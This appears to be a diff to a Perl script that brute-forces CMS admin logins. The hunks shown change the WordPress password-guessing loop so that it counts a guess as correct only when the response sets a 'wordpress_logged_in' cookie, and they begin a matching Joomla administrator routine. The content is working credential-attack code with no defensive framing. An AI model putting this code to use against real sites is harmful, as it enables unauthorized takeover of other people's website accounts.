@@ -243,8 +243,10 @@ $wpass = $_;
 print "\n[-] Trying: $wpass ";
 $wpbrute = POST $wp, [log => $wpuser, pwd => $wpass, wp-submit => 'Log In', redirect_to => $redirect];
 $response = $ua->request($wpbrute);
-$stat = $response->status_line;
-    if ($stat =~ /302/){
+my $stat = $response->as_string;
+
+if($stat =~ /Location:/){
+if($stat =~ /wordpress_logged_in/){
 
 print "- ";
 print color('bold green'),"FOUND\n";
@@ -257,7 +259,7 @@ next OUTER;
 }
 }
 }
-
+}
 ###### Joomla #######
 sub joomla{
 $joomsite = $site . '/administrator/index.php';
